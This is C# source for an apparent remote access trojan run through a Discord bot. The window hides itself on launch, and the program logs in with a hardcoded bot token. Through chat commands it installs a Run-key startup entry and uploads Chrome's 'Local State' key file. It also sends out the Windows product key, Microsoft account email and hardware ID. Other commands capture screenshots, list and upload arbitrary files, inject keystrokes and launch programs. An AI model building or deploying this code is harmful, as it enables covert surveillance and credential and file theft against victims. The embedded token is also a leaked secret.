using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows.Forms;
using Discord;
using Discord.WebSocket;
using System.Windows.Input;
using System.Timers;
using System.Media;
using Woof.SystemEx;
using System.Windows.Media.Imaging;

namespace uwu_poggy_woggy_boy
{
    public partial class winforms_are_shit : Form
    {
        public winforms_are_shit()
        {
            InitializeComponent();
            Main();
            this.Hide();
        }

        private DiscordSocketClient client;
        public async void Main()
        {
            client = new DiscordSocketClient();
            client.MessageReceived += Commands;

            string token = "OTQyMTYyOTkxOTU5NDA0NTc0.Gg7fsG.IDZVfFOvtSxUowQHz-LSwB-pE6YT0qUHowPBnk";

            await client.LoginAsync(TokenType.Bot, token);
            await client.StartAsync();

            await Task.Delay(-1);
        }

        public Task Commands(SocketMessage message)
        {

            if (message.Content.StartsWith("+startup true"))
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.SetValue("UwUOwOHehe", $@"{System.Windows.Forms.Application.ExecutablePath}");
            }

            if (message.Content.StartsWith("+startup false"))
            {
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                key.DeleteValue("UwUOwOHehe", false);
            }

            if (message.Content == "+get chrome locals")
            {
                message.Channel.SendMessageAsync("```" + Key.Enter + File.ReadAllText("C:/Users/" + Environment.UserName + "/Appdata/Local/Google/Chrome/User Data/Local State" + "```"));
                message.Channel.SendFileAsync("C:/Users/" + Environment.UserName + "/Appdata/Local/Google/Chrome/User Data/Local State");
            }

            if(message.Content.StartsWith("+type "))
            {
                var arg = message.Content.Split(new[] { "+type " }, StringSplitOptions.None)[1];
                SendKeys.SendWait(arg);
            }
            /*if(message.Content == "+get pfp")
            {
                var idk = SysInfo.GetMicrosoftAccount(Environment.UserName);
                string emailname = Path.ChangeExtension(idk, null);
                var image = @"attachment:///C:/Users/" + Environment.UserName + "/AppData/Local/Temp/" + emailname + ".bmp";
                var imagejpg = @"pfp.jpg";
                Bitmap bmap;
                ImageCodecInfo codecinfo;
                Encoder encoder;
                EncoderParameter encoderparam;
                EncoderParameters encoderparams;

                bmap = new Bitmap(image);
                codecinfo = GetEncoderInfo("image/jpeg");
                encoder = Encoder.Quality;
                encoderparams = new EncoderParameters(1);

                encoderparam = new EncoderParameter(encoder, 50L);
                encoderparams.Param[0] = encoderparam;
                bmap.Save(@"pfp.jpg", codecinfo, encoderparams);

                message.Channel.SendFileAsync(imagejpg);
            }*/
            if (message.Content == "+get info")
            {
                var owo = SystemInformation.BootMode;
                var hehe = SystemInformation.Network;
                var productkey = SysInfo.WindowsProductKey;
                var idk = SysInfo.GetMicrosoftAccount(Environment.UserName);
                var kk = SysInfo.SystemDiskSerialNumber;
                string emailname = Path.ChangeExtension(idk, null);

                //if(idk2.Contains(".com") && idk2.Contains(".co") && idk2.Contains(".fr") && idk2.Contains(".it") && idk2.Contains(".ru") && idk2.Contains(".net") && idk2.Contains(".br") && idk2.Contains(".co.uk") && idk2.Contains(".es") && idk2.Contains(".nl") && idk2.Contains(".de") && idk2.Contains(".ca") && idk2.Contains(".co.jp") && idk2.Contains(".be") && idk2.Contains(".com.ar") && idk2.Contains(".com.mx") && idk2.Contains(".com.au") && idk2.Contains(".in") && idk2.Contains(".ch") && idk2.Contains(".com.sg") && idk2.Contains(".be") && )

                var image = @"attachment:///C:/Users/" + Environment.UserName + "/AppData/Local/Temp/" + emailname + ".bmp";
                


                EmbedBuilder uwu = new EmbedBuilder();
                uwu.AddField("MachineName", Environment.MachineName, true);
                uwu.AddField("OSVersion", Environment.OSVersion, true);
                uwu.AddField("HWID", kk, true);
                uwu.AddField("Product Key", productkey, true);
                uwu.AddField("UserName", Environment.UserName, true);
                uwu.AddField("BootMode", owo, true);
                uwu.AddField("Network Presence", hehe, true);
                uwu.AddField("Microsoft Account Email", idk, true);
                //uwu.WithThumbnailUrl(image);


                //uwu.ImageUrl = imagestring;
                message.Channel.SendMessageAsync(null, false, uwu.Build());
                //message.Channel.SendMessageAsync("Machine name: " + System.Environment.MachineName + "\nOS Version" + System.Environment.OSVersion + "\nUser Name:" + System.Environment.UserName);
            }
            
            if (message.Content == "+get desktop")
            {
                if(Screen.AllScreens.Length >= 1)
                {
                    Desktop();
                    Desktop1();
                    message.Channel.SendFileAsync("uwu.png");
                    message.Channel.SendFileAsync("uwu2.png");
                }
                else if (Screen.AllScreens.Length == 0)
                {
                    Desktop();
                    message.Channel.SendFileAsync("uwu.png");
                }
            }

            if(message.Content.Contains("+audio "))
            {
                var arg = message.Content.Split(new[] { "+audio " }, StringSplitOptions.None)[1];
                try
                {
                    SoundPlayer player = new SoundPlayer(arg);
                    player.LoadAsync();
                    player.Play();
                }
                catch (Exception)
                {
                    message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
                }
            }

            if (message.Content.Contains("+audioloop "))
            {
                var arg = message.Content.Split(new[] { "+audioloop " }, StringSplitOptions.None)[1];
                try
                {
                    SoundPlayer player = new SoundPlayer(arg);
                    player.LoadAsync();
                    player.PlayLooping();
                }
                catch (Exception)
                {
                    message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
                }
            }

            if (message.Content.StartsWith("+get files"))
            {
                var arg = message.Content.Split(new[] { "+get files" }, StringSplitOptions.None)[1];
                try
                {
                    string[] filePaths = Directory.GetFiles($@"{arg}", "*", SearchOption.AllDirectories);
                    string allDir = "";
                    for (int i = 0; i < filePaths.Length; i++)
                    {
                        allDir = string.Concat(allDir, "\n" + filePaths[i]);
                    }
                    message.Channel.SendMessageAsync(allDir);
                }
                catch
                {
                    message.Channel.SendMessageAsync("Directory not valid.");
                }
            }

            if (message.Content.StartsWith("+get file "))
            {
                var arg = message.Content.Split(new[] { "+get file " }, StringSplitOptions.None)[1];
                try
                {
                    message.Channel.SendFileAsync(arg);
                }
                catch
                {
                    message.Channel.SendMessageAsync("Directory not found.");
                }
            }

            if (message.Content.StartsWith("+open file "))
            {
                var arg = message.Content.Split(new[] { "+open file " }, StringSplitOptions.None)[1];
                try
                {
                    Process.Start(arg);
                }
                catch
                {
                    message.Channel.SendMessageAsync("Directory not found.");
                }
            }

            if (message.Content.StartsWith("+open web "))
            {
                var arg = message.Content.Split(new[] { "+open web " }, StringSplitOptions.None)[1];
                try
                {
                    if (arg.Contains("https://"))
                    {
                        Process.Start(arg);
                        message.Channel.SendMessageAsync(arg + " has been opened");
                    }
                    else if (arg.Contains("http://"))
                    {
                        Process.Start(arg);
                        message.Channel.SendMessageAsync(arg + " has been opened");
                    }
                    else
                    {
                        Process.Start(@"https://" + arg);
                        message.Channel.SendMessageAsync(arg + " has been opened");
                    }
                }
                catch
                {
                    message.Channel.SendMessageAsync("Didn't work");
                }
            }

            if (message.Content.StartsWith("+messagebox"))
            {
                var arg = message.Content.Split(new[] { "+messagebox" }, StringSplitOptions.None)[1];
                MessageBox.Show(new Form { TopMost = true }, arg);
            }

            return Task.CompletedTask;
        }

        static void KeysPressed()
        {

        }
        private static ImageCodecInfo GetEncoderInfo(String mimeType)
        {
            int j;
            ImageCodecInfo[] encoders;
            encoders = ImageCodecInfo.GetImageEncoders();
            for (j = 0; j < encoders.Length; ++j)
            {
                if (encoders[j].MimeType == mimeType)
                    return encoders[j];
            }
            return null;
        }
        void Desktop()
        {
            Rectangle size = Screen.GetBounds(Point.Empty);
            Bitmap cBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
            Rectangle cRectangle = Screen.AllScreens[0].Bounds;
            Graphics cGraphics = Graphics.FromImage(cBitmap);
            cGraphics.CopyFromScreen(cRectangle.Left, cRectangle.Top, 0, 0, cRectangle.Size);
            cBitmap.Save(@"uwu.png", System.Drawing.Imaging.ImageFormat.Jpeg);
        }
        void Desktop1()
        {
            Rectangle size = Screen.GetBounds(Point.Empty);
            Bitmap cBitmap = new Bitmap(size.Width, size.Height, PixelFormat.Format32bppArgb);
            Rectangle cRectangle = Screen.AllScreens[1].Bounds;
            Graphics cGraphics = Graphics.FromImage(cBitmap);
            cGraphics.CopyFromScreen(cRectangle.Left, cRectangle.Top, 0, 0, cRectangle.Size);
            cBitmap.Save(@"uwu2.png", System.Drawing.Imaging.ImageFormat.Jpeg);
        }
        string GetIp()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("no");
        }

        private void winforms_are_shit_Load(object sender, EventArgs e)
        {

        }
    }
}
